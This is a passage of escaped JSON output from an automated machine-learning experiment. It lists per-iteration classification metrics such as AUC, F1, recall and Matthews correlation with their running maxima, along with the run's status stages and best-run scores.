\"recall_score_macro\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.7053588221478819, 0.7368196523334581, 0.6902447460470517, 0.7354094676715595, 0.6861231713951024, 0.6802398660709119, 0.6700802759082853, 0.6192367803744601, 0.5198936532102921, 0.710895354907291, 0.7266032618252306, 0.721490156215082, 0.694197461975485, 0.7066421706909842, 0.7059453925657578, 0.684214787648444, 0.719233414051666, 0.7078583120795936, 0.7199441233709749, 0.696352383609731, 0.7315550468438914, 0.7292912489194303, 0.705585176022082, 0.724047222468623, 0.7338151230656906, 0.7013386491181416, 0.7169354936461194, 0.708226466134825, 0.6571198396095583, 0.731731162800476, 0.7116353268500302, 0.6976899975757002, 0.7492738629258777, 0.5515150915288087, 0.724745825242662, 0.7496973152420721]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"lines\", \"name\": \"recall_score_macro_max\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.7053588221478819, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7492738629258777, 0.7492738629258777, 0.7492738629258777, 0.7496973152420721]}], \"precision_score_micro\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"markers\", \"name\": \"precision_score_micro\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.7396103896103897, 0.7695659603554341, 0.7538277511961724, 0.7461893369788106, 0.7513670539986329, 0.7448393711551605, 0.7448735475051265, 0.7122009569377992, 0.6640977443609023, 0.7161312371838687, 0.7226930963773068, 0.7161995898838005, 0.6939336978810664, 0.7565618591934381, 0.7565618591934382, 0.7526999316473001, 0.722658920027341, 0.713585099111415, 0.718762816131237, 0.7434894053315106, 0.746103896103896, 0.7656356801093642, 0.7448906356801095, 0.7591079972658921, 0.7643882433356118, 0.7395933014354067, 0.7539302802460697, 0.746120984278879, 0.7095864661654134, 0.7435235816814764, 0.7566302118933697, 0.7512816131237183, 0.7552631578947369, 0.6653622693096377, 0.7330827067669173, 0.7865345181134655]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"lines\", \"name\": \"precision_score_micro_max\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.7396103896103897, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7865345181134655]}], \"average_precision_score_micro\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"markers\", \"name\": \"average_precision_score_micro\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.8229290538102472, 0.8549562655774119, 0.841081927666514, 0.83947463323363, 0.8368488695614502, 0.8375809300751159, 0.8310639019599405, 0.8161529369997327, 0.8035044842008185, 0.7953496181324807, 0.8218463715618064, 0.8072641210366974, 0.7772978527336585, 0.8440167132857228, 0.8423663408515599, 0.8388714036238258, 0.8151354022936135, 0.8225802299884524, 0.8022115363847984, 0.8481665708323544, 0.8167565482826907, 0.848898506132646, 0.8389823937410112, 0.8384628409140362, 0.8485687405511617, 0.813259039495868, 0.8380485349049931, 0.835167072801771, 0.7644110802641583, 0.8159254115506265, 0.82871185188212, 0.8293173352087979, 0.8366386698679704, 0.723336678500669, 0.7997928207158796, 0.8662922604618177]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"lines\", \"name\": \"average_precision_score_micro_max\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.8229290538102472, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8662922604618177]}], \"f1_score_micro\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"markers\", \"name\": \"f1_score_micro\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.7396103896103897, 0.7695659603554341, 0.7538277511961724, 0.7461893369788106, 0.7513670539986329, 0.7448393711551605, 0.7448735475051265, 0.7122009569377992, 0.6640977443609023, 0.7161312371838687, 0.7226930963773068, 0.7161995898838005, 0.6939336978810664, 0.7565618591934381, 0.7565618591934382, 0.7526999316473, 0.722658920027341, 0.713585099111415, 0.718762816131237, 0.7434894053315106, 0.746103896103896, 0.7656356801093642, 0.7448906356801095, 0.7591079972658921, 0.7643882433356118, 0.7395933014354067, 0.7539302802460697, 0.746120984278879, 0.7095864661654134, 0.7435235816814764, 0.7566302118933697, 0.7512816131237183, 0.7552631578947369, 0.6653622693096377, 0.7330827067669172, 0.7865345181134655]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"lines\", \"name\": \"f1_score_micro_max\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.7396103896103897, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7865345181134655]}], \"AUC_weighted\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"markers\", \"name\": \"AUC_weighted\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.7981013916226355, 0.8366210317228242, 0.8184166255228146, 0.8272797328496244, 0.819847121102236, 0.8168489506615664, 0.8095207622836478, 0.7975471894851786, 0.8032402636119516, 0.7863055119812821, 0.8157791226708729, 0.8077418648139574, 0.7730421741529475, 0.8208075252024681, 0.8205795137635292, 0.8182557899823413, 0.8146684859858795, 0.8103766857700506, 0.8038715350816299, 0.8223062796119004, 0.8210231746055501, 0.8240266352875374, 0.8152208505797622, 0.8161128629984556, 0.8298472723094127, 0.7868068256935232, 0.8152011213268441, 0.8132809201585477, 0.7223318252269507, 0.824504073976563, 0.8042664235382981, 0.8126561686834268, 0.8347991057108812, 0.6816126722063267, 0.8072598439331348, 0.8474947459449205]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"lines\", \"name\": \"AUC_weighted_max\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.7981013916226355, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8474947459449205]}], \"f1_score_weighted\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"markers\", \"name\": \"f1_score_weighted\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.7376523503026942, 0.7674902736086928, 0.7400941938762762, 0.7502402071599938, 0.7357327831003957, 0.7305689046541929, 0.7238680633551977, 0.6759131187726666, 0.5476976277449045, 0.7221435277846162, 0.7293463923577626, 0.7225554030940942, 0.7001488846242666, 0.7489865561083529, 0.7482132885830046, 0.7356793640322026, 0.7273650122479361, 0.7196260373404346, 0.7247806788405657, 0.7379882064803635, 0.749160183914171, 0.762640417488469, 0.7423193533904254, 0.7569847044829338, 0.7629439253604393, 0.737350710928568, 0.7511023528248603, 0.7428570411811651, 0.7008894697979599, 0.746836269578936, 0.7515302602996433, 0.7420865564870891, 0.7592546081055642, 0.6057758995306628, 0.7373242904399795, 0.7834882976399731]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"lines\", \"name\": \"f1_score_weighted_max\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.7376523503026942, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7834882976399731]}], \"norm_macro_recall\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"markers\", \"name\": \"norm_macro_recall\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.41071764429576385, 0.4736393046669162, 0.38048949209410315, 0.47081893534311875, 0.37224634279020463, 0.3604797321418237, 0.3401605518165706, 0.23847356074892012, 0.03978730642058435, 0.421790709814582, 0.45320652365046127, 0.4429803124301639, 0.3883949239509698, 0.41328434138196846, 0.4118907851315158, 0.3684295752968879, 0.4384668281033318, 0.41571662415918703, 0.43988824674194993, 0.3927047672194618, 0.4631100936877828, 0.4585824978388608, 0.41117035204416386, 0.44809444493724576, 0.4676302461313814, 0.40267729823628323, 0.43387098729223883, 0.41645293226964986, 0.3142396792191168, 0.46346232560095224, 0.4232706537000605, 0.39537999515140043, 0.49854772585175544, 0.10541447478272263, 0.4494916504853241, 0.499394630484144]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"lines\", \"name\": \"norm_macro_recall_max\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.41071764429576385, 0.4736393046669162, 0.4736393046669162, 0.4736393046669162, 0.4736393046669162, 0.4736393046669162, 0.4736393046669162, 0.4736393046669162, 0.4736393046669162, 0.4736393046669162, 0.4736393046669162, 0.4736393046669162, 0.4736393046669162, 0.4736393046669162, 0.4736393046669162, 0.4736393046669162, 0.4736393046669162, 0.4736393046669162, 0.4736393046669162, 0.4736393046669162, 0.4736393046669162, 0.4736393046669162, 0.4736393046669162, 0.4736393046669162, 0.4736393046669162, 0.4736393046669162, 0.4736393046669162, 0.4736393046669162, 0.4736393046669162, 0.4736393046669162, 0.4736393046669162, 0.4736393046669162, 0.49854772585175544, 0.49854772585175544, 0.49854772585175544, 0.499394630484144]}], \"matthews_correlation\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"markers\", \"name\": \"matthews_correlation\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.4163237794803841, 0.4814237328189323, 0.4261493816650946, 0.45755850910300966, 0.4250705833236809, 0.40864907245265003, 0.39935110955286046, 0.31237733314322236, 0.08802225240946301, 0.4079093988450249, 0.43496466539816553, 0.42592748854647916, 0.37379855631194486, 0.4416434332541396, 0.4395882081064378, 0.42461688066271847, 0.4254813547781158, 0.40218212549539983, 0.4221751138158726, 0.41265260783877833, 0.453506295578614, 0.46857938586539943, 0.423054777853055, 0.456012284881378, 0.47375087351202155, 0.411715829806106, 0.4444112876474427, 0.42862188295384407, 0.3322627875949803, 0.45340140822295305, 0.44411069056919494, 0.42576120012511315, 0.48424754131565206, 0.16396846971954554, 0.4356300912635991, 0.5148997885404539]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"lines\", \"name\": \"matthews_correlation_max\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.4163237794803841, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.48424754131565206, 0.48424754131565206, 0.48424754131565206, 0.5148997885404539]}], \"average_precision_score_macro\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"markers\", \"name\": \"average_precision_score_macro\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.7742813465855433, 0.817147214521911, 0.7957499129564262, 0.8104982703777374, 0.7997938192585666, 0.8019315280298407, 0.7935732990354288, 0.7823095450305552, 0.7902105546700653, 0.7761809451689181, 0.8041252648211511, 0.7880825915151576, 0.755878477400071, 0.808682183717061, 0.8020848749483658, 0.8033995160217705, 0.7994239371078052, 0.7993974917337422, 0.7770588327308386, 0.8004886674886272, 0.8062106890251066, 0.8017118355199807, 0.7923490340846248, 0.7935532742420122, 0.8056548266270042, 0.7662694299025903, 0.7933451569352845, 0.7920414064829485, 0.7152933693603052, 0.8080576343471144, 0.7888992803125079, 0.7834293299028665, 0.8147082117723293, 0.6596148278221279, 0.7970031924935057, 0.8301195616696537]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"lines\", \"name\": \"average_precision_score_macro_max\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.7742813465855433, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.8301195616696537]}], \"balanced_accuracy\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"markers\", \"name\": \"balanced_accuracy\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.7053588221478819, 0.7368196523334581, 0.6902447460470517, 0.7354094676715595, 0.6861231713951024, 0.6802398660709119, 0.6700802759082853, 0.6192367803744601, 0.5198936532102921, 0.710895354907291, 0.7266032618252306, 0.721490156215082, 0.694197461975485, 0.7066421706909842, 0.7059453925657578, 0.684214787648444, 0.719233414051666, 0.7078583120795936, 0.7199441233709749, 0.696352383609731, 0.7315550468438914, 0.7292912489194303, 0.705585176022082, 0.724047222468623, 0.7338151230656906, 0.7013386491181416, 0.7169354936461194, 0.708226466134825, 0.6571198396095583, 0.731731162800476, 0.7116353268500302, 0.6976899975757002, 0.7492738629258777, 0.5515150915288087, 0.724745825242662, 0.7496973152420721]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"lines\", \"name\": \"balanced_accuracy_max\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.7053588221478819, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7368196523334581, 0.7492738629258777, 0.7492738629258777, 0.7492738629258777, 0.7496973152420721]}], \"AUC_macro\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"markers\", \"name\": \"AUC_macro\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.7981013916226355, 0.8366210317228242, 0.8184166255228146, 0.8272797328496242, 0.819847121102236, 0.8168489506615664, 0.8095207622836478, 0.7975471894851786, 0.8032402636119518, 0.786305511981282, 0.8157791226708729, 0.8077418648139574, 0.7730421741529475, 0.8208075252024681, 0.8205795137635292, 0.8182557899823415, 0.8146684859858795, 0.8103766857700506, 0.8038715350816299, 0.8223062796119006, 0.8210231746055501, 0.8240266352875374, 0.8152208505797622, 0.8161128629984556, 0.8298472723094127, 0.7868068256935233, 0.8152011213268441, 0.8132809201585477, 0.7223318252269507, 0.824504073976563, 0.8042664235382979, 0.8126561686834268, 0.8347991057108812, 0.6816126722063267, 0.8072598439331348, 0.8474947459449205]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"lines\", \"name\": \"AUC_macro_max\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.7981013916226355, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8474947459449205]}]}, \"metricName\": null, \"primaryMetricName\": \"AUC_weighted\", \"showLegend\": false}, \"run_metrics\": [{\"name\": \"experiment_status\", \"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea\", \"categories\": [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13], \"series\": [{\"data\": [\"DatasetEvaluation\", \"FeaturesGeneration\", \"DatasetFeaturization\", \"DatasetFeaturizationCompleted\", \"DatasetCrossValidationSplit\", \"ModelSelection\", \"BestRunExplainModel\", \"ModelExplanationDataSetSetup\", \"PickSurrogateModel\", \"EngineeredFeatureExplanations\", \"EngineeredFeatureExplanations\", \"RawFeaturesExplanations\", \"RawFeaturesExplanations\", \"BestRunExplainModel\"]}]}, {\"name\": \"experiment_status_description\", \"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea\", \"categories\": [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13], \"series\": [{\"data\": [\"Gathering dataset statistics.\", \"Generating features for the dataset.\", \"Beginning to fit featurizers and featurize the dataset.\", \"Completed fit featurizers and featurizing the dataset.\", \"Generating individually featurized CV splits.\", \"Beginning model selection.\", \"Best run model explanations started\", \"Model explanations data setup completed\", \"Choosing LightGBM as the surrogate model for explanations\", \"Computation of engineered features started\", \"Computation of engineered features completed\", \"Computation of raw features started\", \"Computation of raw features completed\", \"Best run model explanations completed\"]}]}, {\"name\": \"precision_score_micro\", \"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea\", \"categories\": [0], \"series\": [{\"data\": [0.7865345181134655]}]}, {\"name\": \"weighted_accuracy\", \"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea\", \"categories\": [0], \"series\": [{\"data\": [0.813738740947356]}]}, {\"name\": \"log_loss\", \"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea\", \"categories\": [0], \"series\": [{\"data\": [0.47380908698264124]}]}, {\"name\": \"AUC_micro\", \"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea\", \"categories\": [0], \"series\": [{\"data\": [0.8641018324410416]}]}, {\"name\": \"balanced_accuracy\", \"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea\", \"categories\": [0], \"series\": [{\"data\": [0.7496973152420721]}]}, {\"name\": \"precision_score_weighted\", \"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea\", \"categories\": [0], \"series\": [{\"data\": [0.785571587745776]}]}, {\"name\": \"f1_score_weighted\", \"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea\", \"categories\": [0], \"series\": [{\"data\": [0.7834882976399731]}]}, {\"name\": \"accuracy\", \"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea\", \"categories\": [0], \"series\": [{\"data\": [0.7865345181134655]}]}, {\"name\": \"precision_score_macro\", \"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea\", \"categories\": [0], \"series\": [{\"data\": [0.765731431102614]}]}, {\"name\": \"f1_score_micro\", \"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea\", \"categories\": [0], \"series\": [{\"data\": [0.7865345181134655]}]}, {\"name\": \"AUC_weighted\", \"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea\", \"categories\": [0], \"series\": [{\"data\": [0.8474947459449205]}]}, {\"name\": \"matthews_correlation\", \"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea\", \"categories\": [0], \"series\": 